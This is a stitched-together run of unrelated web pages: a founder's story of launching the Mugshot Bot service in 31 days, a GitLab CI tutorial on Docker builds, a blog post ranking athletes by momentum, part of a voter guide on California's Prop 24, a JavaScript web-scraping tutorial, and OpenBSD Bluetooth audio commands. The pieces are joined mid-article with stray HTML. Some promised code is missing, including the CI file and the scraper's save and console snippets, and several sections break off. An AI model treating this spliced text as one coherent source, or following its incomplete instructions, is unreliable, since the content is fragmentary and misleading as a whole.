href="https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/10/C03-Family-hugging.png"><img loading="lazy" src="https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/10/C03-Family-hugging.png" alt="family hugging each other drawing illustration" width="1500" height="1100" srcset="https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/10/C03-Family-hugging.png 1500w, https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/10/C03-Family-hugging-300x220.png 300w, https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/10/C03-Family-hugging-1024x751.png 1024w, https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/10/C03-Family-hugging-768x563.png 768w, https://2m93ao7jjy53ndft63v8tvcp-wpengine.netdna-ssl.com/wp-content/uploads/2020/10/C03-Family-hugging-610x447.png 610w" sizes="(max-width: 1500px) 100vw, 1500px"></a></p><p>In the meantime, your world is a much simpler place.

<p>When I get something in my head I dive in. And I dive deep. For example, a month ago I ran into a problem. One week later I solved it. And three weeks after that I turned it into a (tiny) business.</p>

<p>Here’s how I went from an idea in a notebook to my first paying customer. In 31 days.</p>

<h2 id="the-problem">The problem</h2>

<p>It started when I was finishing up a <a href="https://masilotti.com/test-deep-links-with-ui-testing/">blog post</a>. I had everything ready: the article was proof read, the code samples were in place, and a gist was uploaded to GitHub.</p>

<p>But I forgot about the social share image. You know, the little preview that pops up when you tweet a link.</p>

<p><img src="https://masilotti.com/images/twitter-card.png" alt="Twitter card preview for blog post"></p>

<p>I spent <em>forever</em> trying to find the perfect stock photo. I tried all the “no design” tools to create one in my browser. Some were OK, a few were good, but most were just plain <em>generic</em>.</p>

<p>So I vowed to never waste another second generating these images.</p>

<h2 id="the-process">The process</h2>

<p>What follows is a day-by-day overview of what I worked on and important milestones in building up the implementation.</p>

<h3 id="day-1-the-idea">Day 1: The idea</h3>

<p>What if I could automate all my social share images? Instead of futzing with a tool, I wanted to just drop a URL on my page and have that generate a decent looking preview.</p>

<p>So I jotted some notes for a MVP. What’s the absolute least I could build to get market validation?</p>

<p><img src="https://masilotti.com/images/notebook.jpeg" alt="Notes for Mugshot Bot on August 18, 2020"></p>

<p>If you can’t read my chicken scratch most of those notes touch on three basic pieces of functionality.</p>
<ol>
  <li>Scrape a website for the <code>og:title</code> and <code>og:description</code></li>
  <li>Render an HTML view with a fixed design and drop in the scraped content</li>
  <li>Convert to an image and host it</li>
</ol>

<p>Turns out, if I kept the scope very narrow I could get something built pretty quickly. And so <a href="https://www.mugshotbot.com/?utm_source=masilotti.com">Mugshot Bot</a> was born.</p>

<h3 id="day-2-rails-new">Day 2: <code>rails new</code></h3>

<p>Ah, the most exciting part of a project, creating a new app!</p>

<p>I spent the better part of the next few days heads down getting something working. Rails, Active Storage, and <code>wkhtmlto*</code> were all key players in being able to build something so quickly.</p>

<p>Having a hyper-focused scope encouraged me to work on only what mattered. There was no pressure to make things look pretty yet, just get it working.</p>

<h3 id="day-4-launch-the-mvp">Day 4: Launch the MVP</h3>

<p>Three days later I had something working. It was ugly and there was no landing page, but it worked.</p>

<p><img src="https://masilotti.com/images/mugshot-bot-v1.jpeg" alt="v1 of Mugshot Bot"></p>

<p>I <a href="https://twitter.com/joemasilotti/status/1296089448942379008">tweeted</a> asking for beta testers and discovered a few folks who were interested in helping. A few DMs later and the images were live on three different blogs!</p>

<p>I also <a href="https://news.ycombinator.com/item?id=24335060">posted to Hacker News</a> with low expectations. But I made it to the top of the second page and generated over 2000 clicks.</p>

<h3 id="days-5-21-gather-feedback-improve-rinse-and-repeat">Days 5-21: Gather feedback, improve, rinse and repeat</h3>

<p>The next two weeks were spent talking to as many people as possible to ask as many questions as they would answer.</p>

<p>I learned a lot of valuable information, including what to call these little images. Most importantly, people were excited. Turns out I wasn’t the only one running into this problem.</p>

<p>During this time I also built out a landing page to test copy. This was helpful in learning how people describe the problem.</p>

<p><img src="https://masilotti.com/images/mugshot-bot-landing.jpeg" alt="Mugshot Bot landing page v1"></p>

<p>Every feature from here on out has come from (potential) customer feedback. This was an important learning because I usually build things where I’m the only customer.</p>

<h3 id="day-22-launch-customizations">Day 22: Launch customizations</h3>

<p>The most requested feature by a long shot was customizations. Bloggers wanted to make their social share images look like their own, with their own branding.</p>

<p><img src="https://masilotti.com/images/mugshot-bot-v2.png" alt="v2 of Mugshot Bot"></p>

<p>So I added <a href="https://github.com/thoughtbot/clearance">Clearance</a> for authentication and launched <code>/customize</code>, a single form to change a variety of settings. Now bloggers could change the accent color, the background pattern, and even upload a branded image for one of the themes.</p>

<p>Simple, on purpose. Because that’s exactly what folks had asked for.</p>

<h3 id="day-31-first-paying-customer">Day 31: First paying customer!</h3>

<p>I spent all day Saturday at <a href="https://www.weekendclub.co/?utm_source=masilotti.com">Weekend Club</a>, an Indie Hacker accountability community. Even though I had to start early (5am EST!) I was able to finish up the Stripe integration and create a Pro plan for exclusive themes.</p>

<p>I received a ton of valuable feedback throughout the day. Everything from design tweaks to UX pointers to newsletter recommendations. And before the end of the day, <strong>BOOM</strong>! Someone saw enough value in the product to start paying for the Pro features.</p>

<h2 id="the-takeaways">The takeaways</h2>

<p>I’m a developer at heart. I love to build things. But I spent <em>more than half</em> of the month talking to potential customers.</p>

<p>It took just 3 days to build an MVP. I could have spent 3 months building something that was “better” but with zero market fit.</p>

<p>It’s easy to read books and learn how important this step is in building a product. But to actually <em>live</em> it is mind blowing. And the results speak for themselves.</p>

<h3 id="looking-forward">Looking forward</h3>

<p>In no way is this journey complete. Hell, it’s only the beginning.</p>

<p><a href="https://www.mugshotbot.com/?utm_source=masilotti.com">
  <img src="https://masilotti.com/images/mugshot-bot-v3.jpg" alt="v3 of Mugshot Bot">
</a></p>

<p>Acquiring a customer is one of the most motivating things I’ve done since going independent. I’ve never been more excited about building something.</p>

        <p><small>2020-10-26</small></p>

        <p>If you’re like me, you develop a lot of things and test on Raspberry Pis (ARM) and then deploy to production on AMD64 processors. This is all well and good, if you don’t mind spending time re-building the containers on each architecture, but I do mind. I want to write code, not deal with the back-end non-sense.</p>

<p>I’m a big fan of Gitlab’s CI/CD platform, so I figured there should be a good way to use it to get me to my goals. It turns out, it was pretty simple.</p>

<p>In the end, we’ll be able to commit some code and Gitlab will build the Docker containers then push them to Docker Hub.</p>

<p>First, you’ll need to log in to Docker Hub and create an Access Token <code>Username -&gt; Account Settings -&gt; Security</code>. While you’re here, go ahead and create a repository for your docker images. You’ll need the repo name later.</p>

<p>Now head over to your repository on <a href="https://wes.today/gitlab.com">gitlab.com</a> and add your Username and Access Key as Variables <code>Settings -&gt; CI/CD -&gt; Variables</code>. You’ll want to create two variables with the following key:value pairs. I flagged my variables as Protected and Masked so they wouldn’t show up in my CI/CD logs.</p>

<div><div><pre><code>Key: DOCKER_USERNAME
Value: youruserhere

Key: DOCKER_PASSWORD
Value: youraccesstokenhere
</code></pre></div></div>

<p>Now you’ll want to create a <code>.gitlab-ci.yml</code> file in your project and fill it in with the code below. The only thing you’ll need to change is the very last line where you will want to replace <code>repo-name</code> with the name of your Docker Hub Repository. Commit and Push the new <code>.gitlab-ci.yml</code> file and in a few minutes you should see your Docker images in Docker Hub.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page">


<p><em>or Who is Literally the Most Unstoppable Person?</em></p>

<p>
A simple question really.
It popped into my head around the time of the 2012 London Olympics.
I was still playing rugby and studying physics among other things.
It was also likely sparked—at least in part—by a bet I had lost several years prior, that I was heavier than Usain bolt... I was probably around thirteen. Lesson learned.
</p>

<p>
In rugby you quickly learn that the heavier and faster someone is, the harder they are to tackle.
In physics you learn this concept is called momentum (usually given the symbol \(p\)), and is simply an object's mass multiplied by its velocity.

$$p=mv$$
</p>

<p>
Obviously this does not capture <em>all</em> of what makes someone difficult to tackle.
It doesn't account for running technique, agility, or whether they are currently coated in grease.
But it's a pretty good start.
</p>

<p>
After watching Usain Bolt dominate the 100&nbsp;m sprint yet again, the first question became: “Sure he's the fastest, but is he the hardest to stop?”.
</p>

<p>
In the spirit of keeping things simple we're just going to be comparing athletes' <em>average</em> momentum—as it's easy to work out—but it would also be interesting to look into maximums and some other metrics.
I will leave those to the dedicated reader.
Thankfully this sprint distance is pretty relevant because 100&nbsp;m <em>is</em> the length of rugby pitch, which may be why Europeans don't use football fields as a unit of measurement.
</p>

<p>
As a brief refresher, we can work out the velocity (\(v\)) of something given a distance travelled and the time it took:

$$v = \frac{distance}{time}$$

So to get someone's average momentum we can substitute this into the first equation to get:

$$p = \frac{\text{mass} \times \text{distance}}{\text{time}}$$

Which is a super simple calculation. Just multiply their weight (in kilograms) by the distance (in metres) then divide by the time it took (in seconds). The unit of the resulting number will be kilogram metres per second (kg&nbsp;m/s) or equivalently Newton seconds (N&nbsp;s).
</p>

<p>
So if we rescore the men's 2012 Olympics 100m Sprint:
</p>

<table id="sprint2012">
  <tbody><tr>
    <th onclick="w3.sortHTML('#sprint2012','.item', 'td:nth-child(1)')">Athlete</th>
    <th onclick="w3.sortHTML('#sprint2012','.item', 'td:nth-child(2)')">Weight (kg)</th>
    <th onclick="w3.sortHTML('#sprint2012','.item', 'td:nth-child(3)')">Time (s)</th>
    <th onclick="w3.sortHTML('#sprint2012','.item', 'td:nth-child(4)')">Avg Momentum (N&nbsp;s)</th>
  </tr>
  <tr>
    <td>Usain Bolt</td>
    <td>94</td>
    <td><b>09.63</b></td>
    <td>975.72</td>
  </tr>
  <tr>
    <td>Yohan Blake</td>
    <td>76</td>
    <td>09.75</td>
    <td>779.76</td>
  </tr>
  <tr>
    <td>Justin Gatlin</td>
    <td>83</td>
    <td>09.79</td>
    <td>847.43</td>
  </tr>
  <tr>
    <td>Tyson Gay</td>
    <td>77</td>
    <td>09.80</td>
    <td>785.40</td>
  </tr>
  <tr>
    <td>Ryan Bailey</td>
    <td><b>98</b></td>
    <td>09.88</td>
    <td><b>991.76</b></td>
  </tr>
  <tr>
    <td>Churandy Martina</td>
    <td>74</td>
    <td>09.94</td>
    <td>744.44</td>
  </tr>
  <tr>
    <td>Richard Thompson</td>
    <td>80</td>
    <td>09.98</td>
    <td>800.80</td>
  </tr>
  <tr>
    <td>Asafa Powell (inj)</td>
    <td>87</td>
    <td>12.00</td>
    <td>725.58</td>
  </tr>
</tbody></table>

<p>
We see that Ryan Bailey comes out on top as the most unstoppable!
</p>


<h2>Can We Do Better?</h2>
<p>
That's great and all, and we're very proud of Ryan, but perhaps Olympic sprinters aren't the best at this.
The 2012 sprint had a big weight range (24&nbsp;kg) and a big weight difference between first and second place (with Usain Bolt carrying 18&nbsp;kg more than Yohan Blake) so it seems that weight isn't that much of a determining factor for speed.
</p>

<p>
With these people being <em>literally</em> the fastest humans on the planet, the only way to beat them will be by finding someone heavier.
</p>

<p>
As Bailey was so close to 1000&nbsp;N&nbsp;s, that seems like a good milestone to aim for.
So we're looking for big people who can run fast. Rugby and American football seem like obvious places to start looking.
</p>

<p>
There were several promising rugby players, but they were quickly eclipsed by the American footballers I found, likely due to the more specialised nature of American football.
</p>

<h3>Brandon Jacobs</h3>
<!-- ... ~ 1.2?
120 kg
10.82 s
9.2421 m/s
-> 1109 -->
First up is Brandon Jacobs, a former American football running back, who spent the majority of his career with the New York Giants.


<table id="brandon-jacobs">
  <tbody><tr>
    <th>Athlete</th>
    <th>Weight (kg)</th>
    <th>Time (s)</th>
    <th>Avg Momentum (N s)</th>
  </tr>
  
  <tr>
    <td>Brandon Jacobs</td>
    <td>120</td>
    <td>10.82</td>
    <td>1109</td>
  </tr>
</tbody></table>

<p>
He blows our benchmark out of the water with a very impressive 1109 N&nbsp;s, and was the top spot in my mind for a good few years.
That is until my good friend John suggested:
</p>
<!-- Revisit
40yds in 4.56 s
120*(36.576/4.56) = 963

Explain calculations

spectator sport ... -->

<h3>Dontari Poe</h3><!--  ~ 1152.38
157 kg
40yd - 4.98 s
157*(36.576/4.98) = 1153
[no 100m info]
 -->
<p><em>“Can you believe he ran the 40-yard dash in 4.98 seconds? Poe looks like a refrigerator. He’s not supposed to move like that.”</em></p>
<p>
~ Warren Sapp, former defensive tackle and hall of famer
</p>

<p>
Adding a whole new level to the age-old question “Is your refrigerator running?” Poe is another freakish American football player, this time a nose tackle for the Dallas Cowboys.
</p>

<p>
There does not seem to be any 100&nbsp;m data for Poe, so I just used his 40 yard dash time.
This doesn't seem like it will affect our results too much, as Brandon Jacobs' 40 yard dash momentum was worse than his 100&nbsp;m, so if anything we could be underestimating Poe.
</p>

<table id="poe">
  <tbody><tr>
    <th>Athlete</th>
    <th>Weight (kg)</th>
    <th>Time (s)</th>
    <th>Avg Momentum (N s)</th>
  </tr>
  
  <tr>
    <td>Dontari Poe</td>
    <td>157</td>
    <td>4.98</td>
    <td>1153</td>
  </tr>
</tbody></table>

<p>
We have a new champion! It's no surprise this scarily large and scarily fast man is the winner here, but is there anyone out there who could beat him?
</p>


<h3>Hafþór Júlíus Björnsson, a.k.a. The Mountain</h3>
<p>
If you know this Icelandic man of many talents it is likely for his role in Game of Thrones, his strongman career, or both.
At over two metres in height (6 ft 9 in), and weighing in at 205 kg at his peak, this man is truly larger than life and has the commensurate accolades—including breaking the world deadlift record this year when he lifted 501 kg.
</p>

<p>
A lesser known fact is that he used to play basketball professionally, so he is probably still able to run in some capacity.
Perhaps unsurprisingly, the closest thing I could find to any sprint data for Hafþór was him running with a car on his back, but we're interested in the groundspeed velocity of an <em>unladen</em> fellow.
</p>

<p>
Using his most recent weight of 188 kg, we can rearrange the equation from earlier to find out how fast he would have to run a 100 m sprint to knock Dontari Poe off the top spot as the world's most unstoppable person.

$$\frac{100 \text{ m} \times 188 \text{ kg}}{1153 \text{ N s}}= 16.3 \text{ s}$$

But if he were to bulk up a bit more and get back to 205 kg, he would only need to run it in under 17.8 seconds.
</p>

<table id="thor">
    <tbody><tr>
      <th>Athlete</th>
      <th>Weight (kg)</th>
      <th>Time (s)</th>
      <th>Avg Momentum (N s)</th>
    </tr>
    
    <tr>
      <td>Hafþór Júlíus Björnsson</td>
      <td>188</td>
      <td>&lt;&nbsp;16.3?</td>
      <td>&gt;&nbsp;1153?</td>
    </tr>
  </tbody></table>


<p>This seems quite doable—even if he does weigh a fifth of a tonne.</p>

<h2>Epilogue: The Future of the Sport</h2>
<p>
While not a great spectator sport at the moment, and with little hope of it becoming one, it can still be fun to imagine how this would play out were it to become an event.
</p>

<p>
Of course contestants would be weighed right before the event for maximum accuracy.
Everyone might start running on a full stomach, wearing <em>even more</em> chains, or most likely weight vests.
Coaches would measure sprint times versus added weight and optimise to get the best momentum (I would be quite interested to see these graphs even today. Some militaries have likely already researched something along these lines).
The distribution of this added weight would also be quite important, and so to avoid awkwardness and bulkiness people would probably opt for platinum (iridium and osmium are slightly denser, but iridium is more expensive and osmium is more dangerous, rarer and harder to work with).
The sport might bifurcate into max and average camps, and perhaps different distances too like most other events (though presumably fewer in this instance).
</p>

<p>
In the end though, heavier folk will probably fare the best.
It's much better if the extra weight is actually doing something, so muscle wins over dead weight.
And there is no way Churandy Martina is running anywhere near a comparable time with an extra 20 kg—no matter how it's distributed.
</p>

<h3>Calculator</h3>
<p>
Calculate your own momentum and see how unstoppable you are!
</p>
<table id="you">
    <tbody><tr>
      <!-- <th>Athlete</th> -->
      <th>Weight (kg)</th>
      <th>Time (s)</th>
      <th>Avg Momentum (N s)</th>
    </tr>
    
    <tr>
      <!-- <td>You</td> -->
      <td></td>
      <td></td>
      <td id="result"></td>
    </tr>
  </tbody></table>

    <p>
      Proposition 24 is a 52-page law that overhauls privacy laws in California. It's so complex that it has split the privacy community, and experts disagree about what it would mean for Californians. Most voices agree Prop 24 has some changes to love, and some to reject. The typical voter is probably very uncertain about whether to vote "Yes" or "No".
    </p>
    <p>
      We are <strong>San Diego Privacy</strong>, a small group of privacy advocates in San Diego, and we'd like to help by offering a neutral analysis. Below you'll find 10 of the biggest issues with Prop 24, along with the main points supporters (the "Yes" side) and opponents (the "No" side) make about that issue.
    </p>
    <p>We suggest you first pick the issues in purple that jump out to you the most. Then, keep count of whether you find the Yes side or the No side more compelling, for the issues you've picked. Last, total up your counts.</p>
    <p>Then, as always, go vote your values.</p>

    <p><strong><i>Update</i></strong>: When you pick the issues below that matter to you, consider <a href="https://drive.google.com/drive/folders/1FSWtcqBEbe-SOUUWZ9d7j_M3Ft1ap5CR?usp=sharing" target="_blank">downloading a shareable image</a> of that issue as well, and posting it on social media to generate discussion.</p>

            <div>
              <p>
                <strong>Pay for Privacy</strong> means that if you demand privacy, companies can charge you more for goods and services.
              </p>
              <ul>
                <li>Companies that rely on targeted advertising, like newspapers or free streaming music services, currently rely on targeted ads.</li>
                <li>Some privacy options allow you to block the ability to show you targeted ads.</li>
                <li>Pay-for-privacy is already allowed in existing California law.</li>

                </p>
                <p>
                   When interviewed, Prop 24 author Alastair Mactaggart warns the newspaper industry would be hit hard if pay-for-privacy options were blocked. (<a href="https://youtu.be/eWOFZOPJm78?t=2186" target="_blank">Union-Tribune video interview</a> with Yes on 24)

        Authors' Note: It's important to emphasize here that pay-for-privacy is already allowed in current law. Opponents see Prop 24's choice to further expand pay-for-privacy, rather than ban it, as one reason to oppose it.

            <p>I feel strongly about <strong>Global Opt-Out</strong></p>
            <div>
              <p>
                <strong>Global Opt-Out</strong> allows you to set up your privacy options in one place, and have them apply universally. Prop 24 allows companies to ignore those global settings, in some cases.

              </p>
              <ul>
                <li>In the future, you'll be able to set your privacy preferences in one place, rather than at each site or service.</li>
                <li>Prop 24 includes provisions for allowing companies to ignore your global privacy preferences for certain reasons, like if they want you to pay.</li>
                <li>There could be other reasons companies won't have to respect your global privacy preferences.</li>

        Authors' Note: This is a good place to note that many privacy advocates believe all efforts to collect your data should require affirmative consent from you, rather than using the "opt-out" model where companies collect your data first, and then require you to ask it be deleted or not collected.

                Current privacy laws in California are rarely <strong>enforced.</strong> Only the California Attorney General can enforce California's privacy laws.

        Authors' Note: Privacy advocates feel very strongly that Californians should have the "private right of action," or the right to sue companies to enforce privacy law. It seems to us unlikely that privacy organizations will support overhauls to California's privacy laws without that private right of action being included.

<p>If you’ll try to google “web scraping tutorial” you’ll get a bunch of tech articles on the subject that tells you how to achieve the result using python. The toolkit is pretty standard for these posts: python 3 (hopefully not second) as an engine, requests library for fetching, and Beautiful Soup 4 (which is 6 years old) for web parsing.</p>
<p><em>I’ve also seen few articles where they teach you how to parse HTML content with regular expressions, spoiler: <a href="https://stackoverflow.com/a/1732454/7668392">don’t do this</a>.</em>

<p>The problem is that I’ve seen articles like this 5 years ago and this stack hasn’t mostly changed. And more importantly, the solution is not native to javascript developers. If you would like to use technologies you are more familiar with, like ES2020, node, and browser APIs you will miss the direct guidance.</p>
<p>I’ve tried to fill the spot and create ‘the missing doc’.</p>
<h2>Overview</h2>
<blockquote>
<h4>Check if data is available in request</h4>
<p>Before you will start to do any of the programming, always check for the easiest available way. In our case, it would be a direct network request for data.</p>
<p>Open developer tools - F12 in most browsers - then switch to the <code>Network</code> tab and reload the page</p>
<p>If data is not baked in the HTML like it is in half of the modern web applications, there is a good chance that you don’t need to scrape and parse at all.

<p>If you are not so lucky and still need to do the scraping, here is the general overview of the process:</p>
<ol>
<li>fetch the page with the required data</li>
<li>extract the data from the page markup to some in-language structure (Object, Array, Set)</li>
<li>process the data: filter it, transform it to your needs, prepare it for the future usage</li>
<li>save the data: write it to the database or dump it to the filesystem</li>
</ol>
<p>That would be the easiest case for parsing, in sophisticated ones you can bump into some pagination, link navigation, dealing with bot protection (captcha), and even real-time site interaction. But all this wouldn’t be covered in the current guide, sorry.</p>
<h2>Fetching</h2>
<p>As an example of this guide, we will scrape a goal data for Messi from Transfermarkt. You can check his stats <a href="https://www.transfermarkt.com/lionel-messi/alletore/spieler/28003/plus/1">on the site</a>. To load the page from the node environment you will need to use your favorite request library. You can also use the raw HTTP/S module, but it doesn’t even support async, so I’ve picked <a href="https://github.com/node-fetch/node-fetch"><code>node-fetch</code></a> for this task. Your code will look something like:</p>
<div data-language="js"><pre><code><span>const</span> fetch <span>=</span> <span>require</span><span>(</span><span>'node-fetch'</span><span>)</span>

<span>const</span> <span>DATA_URL</span> <span>=</span>
  <span>'https://www.transfermarkt.com/lionel-messi/alletore/spieler/28003/plus/1'</span>
<span>const</span> <span>loadMessiGoals</span> <span>=</span> <span>async</span> <span>(</span><span>)</span> <span>=&gt;</span> <span>{</span>
  <span>const</span> response <span>=</span> <span>await</span> <span>fetch</span><span>(</span><span>DATA_URL</span><span>)</span>
  <span>return</span> response<span>.</span><span>text</span><span>(</span><span>)</span>
<span>}</span>

module<span>.</span>exports <span>=</span> <span>{</span>loadMessiGoals<span>}</span></code></pre></div>
<h2>Tools for parsing</h2>
<p>There are two major alternatives for this task which are conveniently represented with two high-quality most-starred and alive libraries.</p>

    <figcaption>We will use one of them</figcaption>
  </figure>
<p>The first approach is just to build a syntax tree from a markup text and then navigate it with familiar browser-like syntax. This one is fully covered with <a href="https://github.com/cheeriojs/cheerio">cheerio</a> that declared as <code>jQuery for server</code> (IMO, they need to revise their marketing vibes for 2020).</p>
<p>The second way is to build the whole browser DOM but without a browser itself. We can do this with wonderful <a href="https://github.com/jsdom/jsdom">jsdom</a> which is <code>node.js implementation of many web standards</code>.</p>
<p>Let’s take a closer look at both of them.</p>
<h3>cheerio</h3>
<p>Despite these analogies cheerio doesn’t have jQuery in dependencies, it just tries to reimplement most known methods from scratch:</p>
<div data-language="json"><pre><code> <span>"dependencies"</span><span>:</span> <span>{</span>
  <span>"@types/node"</span><span>:</span> <span>"^14.11.2"</span><span>,</span>
  <span>"css-select"</span><span>:</span> <span>"~3.1.0"</span><span>,</span>
  <span>"dom-serializer"</span><span>:</span> <span>"~1.1.0"</span><span>,</span>
  <span>"entities"</span><span>:</span> <span>"~2.1.0"</span><span>,</span>
  <span>"htmlparser2"</span><span>:</span> <span>"^5.0.0"</span><span>,</span>
  <span>"lodash"</span><span>:</span> <span>"^4.17.20"</span><span>,</span>
  <span>"parse5"</span><span>:</span> <span>"^6.0.0"</span><span>,</span>
  <span>"parse5-htmlparser2-tree-adapter"</span><span>:</span> <span>"^6.0.0"</span>
<span>}</span></code></pre></div>
<p>Basic usage is really easy:</p>
<ul>
<li>
<p>you load a HTML</p>
<div data-language="js"><pre><code><span>const</span> $ <span>=</span> cheerio<span>.</span><span>load</span><span>(</span><span>'&lt;ul id="steps"&gt;...&lt;/ul&gt;'</span><span>)</span></code></pre></div>
</li>
<li>
<p>done, you’re great, now you can use JQ selectors/methods</p>

</li>
</ul>
<p>Probably you can pick this one if you need to save on size (cheerio is lightweight and fast) or you are really familiar with jQuery syntax and for some reason want to bring it to your new project. Cheerio is a nice way to do any kind of work with HTML you need in your application.</p>
<h3>jsdom</h3>
<p>This one is a bit more complicated: it tries to emulate part of the whole browser that is working with HTML and JS (apart from rendering the result). It’s used heavily for testing and … well scraping.</p>
<p>Let’s spin up jsdom:</p>
<ul>
<li>
<p>you need to use a constructor with your HTML</p>
<div data-language="js"><pre><code><span>const</span> dom <span>=</span> <span>new</span> <span>JSDOM</span><span>(</span><span>'&lt;!DOCTYPE html&gt;&lt;p&gt;Hello world&lt;/p&gt;'</span><span>)</span></code></pre></div>
</li>
<li>
<p>then you can access standard browser API</p>
<div data-language="js"><pre><code>dom<span>.</span>window<span>.</span>document<span>.</span><span>querySelector</span><span>(</span><span>"p"</span><span>)</span><span>.</span>textContent</code></pre></div>
</li>
</ul>
<p>jsdom is a lot heavier and it does a lot more job. You should understand, why to choose it over other options.</p>
<h2>Parsing</h2>
<p>In our example, I want to stick to the jsdom. It will help us to show one last approach at the end of the article. The parsing part is really vital but very short.</p>
<p>So we’ll start with building a dom from the fetched HTML:</p>
<div data-language="js"><pre><code><span>const</span> dom <span>=</span> <span>new</span> <span>JSDOM</span><span>(</span>goalsHTML<span>)</span></code></pre></div>
<p>Then you can select table content with css selector and browser API. Don’t forget to create a real array from <code>NodeList</code> that <code>querySelectorAll</code> returns.</p>
<div data-language="js"><pre><code><span>const</span> rows <span>=</span> Array<span>.</span><span>from</span><span>(</span>
  dom<span>.</span>window<span>.</span>document<span>.</span><span>querySelectorAll</span><span>(</span><span>'.responsive-table tbody tr'</span><span>)</span>
<span>)</span></code></pre></div>
<p>Now you have a two-dimensional array to work with. This part is finished, now you need to process this data to get clean and ready-to-work-with stats.</p>
<h2>Processing</h2>
<p>First, let’s check the lengths of our rows. Each row is the stat about goal and we mostly don’t care how many do we have. But each row can contain numbers in a different format so we have to deal with them.</p>
<p>We map over rows and get the length. Then we deduplicate results to see what options do we have here.</p>
<div data-language="js"><pre><code><span>const</span> lengths <span>=</span> rows<span>.</span><span>map</span><span>(</span><span>row</span> <span>=&gt;</span> row<span>.</span>length<span>)</span>
<span>const</span> result <span>=</span> <span>[</span><span>...</span><span>new</span> <span>Set</span><span>(</span>lengths<span>)</span><span>]</span>
</code></pre></div>
<p>Not that bad, only 4 different shapes: with 1, 5, 14, and 15 cells.

    </span>
    <figcaption>All the possible row cases</figcaption>
  </figure>
<p>Since we don’t need rank data from extra cell in 15-cells case it is safe to delete it.</p>
<div data-language="js"><pre><code><span>const</span> <span>omitRank</span> <span>=</span> <span>(</span><span>row</span><span>)</span> <span>=&gt;</span>
  row<span>.</span>length <span>===</span> <span>15</span> <span>?</span> <span>[</span><span>...</span>row<span>.</span><span>slice</span><span>(</span><span>0</span><span>,</span> <span>5</span><span>)</span><span>,</span> <span>...</span>row<span>.</span><span>slice</span><span>(</span><span>6</span><span>)</span><span>]</span> <span>:</span> row</code></pre></div>
<p>Row with only one cell is actually useless: it is just a name of the season, so we will skip it.</p>
<div data-language="js"><pre><code><span>if</span> <span>(</span>row<span>.</span>length <span>===</span> <span>1</span><span>)</span> <span>return</span> <span>null</span></code></pre></div>
<p>For the 5-cells case (when player scored few goals in one match) we need to find previous full row and use it’s data for empty stats.</p>
<div data-language="js"><pre><code><span>const</span> <span>getLastMatch</span> <span>=</span> <span>(</span><span>idx<span>,</span> goals</span><span>)</span> <span>=&gt;</span>
  goals<span>[</span>idx<span>]</span><span>.</span>length <span>===</span> <span>14</span> <span>?</span> goals<span>[</span>idx<span>]</span> <span>:</span> <span>getLastMatch</span><span>(</span>idx <span>-</span> <span>1</span><span>,</span> goals<span>)</span>

<span>const</span> match <span>=</span> <span>getLastMatch</span><span>(</span>idx<span>,</span> goals<span>)</span>
<span>const</span> isSameMatch <span>=</span> row<span>.</span>length <span>===</span> <span>14</span></code></pre></div>
<p>Now we just have to manually map data to keys, nothing scientific here and no smart way to avoid it.</p>
<div data-language="js"><pre><code><span>return</span> <span>{</span>
  competition<span>:</span> match<span>[</span><span>1</span><span>]</span><span>,</span>
  matchday<span>:</span> match<span>[</span><span>2</span><span>]</span><span>,</span>

<span>}</span></code></pre></div>
<h2>Saving</h2>
<p>We would just dump our result to a file, converting it to a string first with the <code>JSON.stringify</code> method.</p>
<div data-language="js"><pre><code><span>const</span> fs <span>=</span> <span>require</span><span>(</span><span>'fs'</span><span>)</span><span>.</span>promises

<span>const</span> <span>saveStats</span> <span>=</span> <span>async</span> <span>(</span><span>data</span><span>)</span> <span>=&gt;</span> <span>{</span>

<span>}</span></code></pre></div>

<h2>Bonus: One-time parsing with a snippet</h2>
</blockquote>
<p>Since we used <code>jsdom</code> with the browser-compatible API we actually don’t need any node environment to parse the data. If we just need it once from a particular page we can just run some code at the <code>Console</code> tab in the developers tools of your browser. Try to open <a href="https://www.transfermarkt.com/cristiano-ronaldo/alletore/spieler/8198/plus/1">any player stats on Transfermarkt</a> and paste this giant non-readable snippet to the console:</p>

<p>And now just apply this magic <code>copy</code> function that is integrated into the browser devtools. It would copy data to your clipboard.</p>

<p>Not that hard, right? And no need to deal with <code>pip</code> anymore. I hope you found this article useful. Stay tuned, next time we will visualize this scraped data with modern JS libs.</p>

					<p>I have a pair of <strong>Sony WH-1000XM3</strong> headphones and use them literally every day, most of my waking hours. I'm really addicted to music and my day would be ruined without it. I use Bluetooth to connect them to my phone and the 3.5mm cable when using them on my laptop. A few weeks ago, I forgot the cable at home and had to use the phone all day, since there is <a href="https://marc.info/?l=openbsd-cvs&amp;m=140511572108715&amp;w=2" title="It's not the years, honey; it's the mileage.">no support for Bluetooth in OpenBSD</a>.</p>

					<p>This was really frustrating and I went on ranting about it in <a href="ircs://irc.freenode.net:6697/openbsd" title="#openbsd on Freenode">#openbsd</a>. <a href="https://dataswamp.org/~solene/" title="Solene's percent %">Solène Rapenne</a> told me about an <a href="https://twitter.com/jcs/status/1111806329717432325" title="A tweet by joshua stein.">interesting tweet</a> from <a href="https://jcs.org/" title="joshua stein">jcs@</a>, where he mentions the <a href="https://uk.creative.com/p/sound-blaster/creative-bluetooth-audio-bt-w2-usb-transceiver" title="Creative Bluetooth Audio Transceiver">Creative BT-W2</a>.</p>

					<p>This little device works out of the box and handles the Bluetooth part while presenting OpenBSD with an audio device over USB. However, you will need to configure <a href="https://man.openbsd.org/sndiod.8" title="The manual for sndiod, the audio/MIDI server.">sndiod(8)</a> to send the audio to the <em>rsnd/1</em> device, like this:</p>

					<pre>$ doas rcctl set sndiod flags -f rsnd/1
$ doas rcctl restart sndiod
sndiod(ok)
sndiod(ok)
$ </pre>

					<p>I'm not sure why, but you can't control the volume using the <a href="https://man.openbsd.org/mixerctl.1">mixerctl(1)</a> utility. Instead, you will have to install the <strong>aucatctl</strong> package.

					</p><pre>$ doas pkg_add aucatctl
$ aucatctl master=80</pre>

